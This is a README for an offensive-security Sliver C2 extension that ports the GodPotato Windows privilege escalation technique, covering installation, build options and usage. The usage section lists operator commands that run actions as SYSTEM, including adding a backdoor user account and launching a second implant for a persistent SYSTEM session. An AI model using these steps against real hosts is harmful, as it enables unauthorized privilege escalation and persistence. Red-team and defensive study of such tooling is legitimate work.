# GodPotatoBOF-Sliver

An 100% vibe coded [Sliver C2](https://github.com/BishopFox/sliver) extension port of [GodPotatoBOF](https://github.com/incursi0n/GodPotatoBOF) by incursi0n, itself based on [GodPotato](https://github.com/BeichenDream/GodPotato) by BeichenDream.

Triggers the GodPotato privilege escalation flow (COM/RPC dispatch table hook) to obtain a `NT AUTHORITY\SYSTEM` token run a command.

## Requirements

- `SeImpersonatePrivilege` on the target
- Sliver with `coff-loader` extension installed
- Linux build host with `apt` (for the auto-install path), or a manual install of `mingw-w64` and `make`

## Install

```bash
chmod +x install.sh
./install.sh
```

The installer will:

1. Install `mingw-w64` and `make` via `apt` if missing (uses `sudo` when not root).
2. Download the latest `boflink` release for your architecture from GitHub and verify it against the upstream-published `.sha256` sidecar.
3. Build the BOF (`make sliver`).
4. Copy the compiled `.o` files and `extension.json` into `~/.sliver-client/extensions/godpotato/`.

If the upstream release doesn't ship a `.sha256` sidecar, or the sidecar doesn't match the downloaded archive, the install aborts. There is no silent fallback.

### Subcommands

| Command                | What it does                                            |
| ---------------------- | ------------------------------------------------------- |
| `./install.sh`         | Fetch deps + build + install (default)                  |
| `./install.sh fetch`   | Install apt deps + download boflink only                |
| `./install.sh build`   | Build only (auto-fetches deps if missing)               |
| `./install.sh install` | Copy already-built artefacts into Sliver                |
| `./install.sh clean`   | Remove build artefacts and the installed extension      |

### Environment overrides

| Variable          | Purpose                                                              |
| ----------------- | -------------------------------------------------------------------- |
| `BOFLINK_VERSION` | Install a specific boflink version (e.g. `v0.6.2`). Default: `latest`. |
| `BOFLINK_TARGET`  | Override the auto-detected Rust target triple                        |
| `NO_APT=1`        | Skip auto-install of apt packages                                    |
| `NO_FETCH=1`      | Skip auto-fetch of boflink (use a local binary as-is)                |

If a `boflink` binary already exists at the repo root, the script will use it instead of downloading. If you'd rather always re-fetch and verify, delete it first.

## Verification notes

The installer verifies downloaded `boflink` archives against the `.sha256` sidecar that ships alongside the release on GitHub. This catches download corruption and confirms the archive matches what the release page advertises.

It does **not** prove the binary is authentic — both the archive and the sidecar come from the same release, so an attacker who can publish to upstream controls both. If that threat matters to you, verify the upstream release manually (e.g. by checking the signed Git tag), place the verified `boflink` binary at the repo root, and run `NO_FETCH=1 ./install.sh` to skip the auto-fetch.

## Load in Sliver

```
sliver > extensions load /path/to/GodPotatoBOF-Sliver/sliver-extensions/godpotato
sliver > extensions list
```

If the `.o` files are missing after load, copy them manually:

```
cp sliver-extensions/godpotato/*.o ~/.sliver-client/extensions/godpotato/
```

## Usage

```
sliver (SESSION) > godpotato
sliver (SESSION) > godpotato -- -cmd "whoami /all"
sliver (SESSION) > godpotato -- -cmd "net user hax P@ss /add"
sliver (SESSION) > godpotato -- -cmd "C:\Windows\Temp\implant.exe"
sliver (SESSION) > godpotato -- -cmd "whoami" -pipe mypipe
```

| Argument                   | Description                                                      |
| -------------------------- | ---------------------------------------------------------------- |
| *(none)*                   | Run `cmd /c whoami` as SYSTEM                                    |
| `-- -cmd "<command>"`      | Run a command as SYSTEM                                          |
| `-- -cmd "<implant path>"` | Spawn a second implant as SYSTEM for a persistent SYSTEM session |
| `-- -pipe <name>`          | Use a custom named pipe (auto-generated if omitted)              |

> **Note:** The `token` keyword (`-cmd token`) calls `BeaconUseToken()` but Sliver's coff-loader does not persist impersonation tokens across tasks. Use `-cmd` to run commands as SYSTEM directly, or execute a second implant to get a persistent SYSTEM session.

## Credits

- Original GodPotato: <https://github.com/BeichenDream/GodPotato>
- GodPotatoBOF: <https://github.com/incursi0n/GodPotatoBOF>
- boflink: <https://github.com/MEhrn00/boflink>
- BOF template: <https://github.com/trustedsec/CS-Situational-Awareness-BOF>
